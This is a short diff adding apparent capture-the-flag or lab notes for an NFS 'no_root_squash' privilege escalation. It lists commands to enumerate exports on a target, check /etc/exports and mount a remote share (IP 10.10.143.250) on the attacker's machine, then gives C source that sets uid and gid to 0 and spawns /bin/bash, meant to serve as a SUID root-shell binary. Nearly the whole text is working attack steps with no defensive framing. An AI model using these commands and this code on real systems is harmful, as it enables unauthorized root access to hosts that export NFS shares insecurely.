@@ -1,0 +1,15 @@
+showmount -e <target-ip>
+# check if no_root_squash option is enabled
+cat /etc/exports
+# mount a folder on the attackers machine and create a SUID bit file
+sudo mount -t nfs 10.10.143.250:/home/backup /tmp/mount1 -nolock
+
+```
+int main() {
+setgid(0);
+setuid(0);
+system("/bin/bash");
+return 0;
+
+}
+```
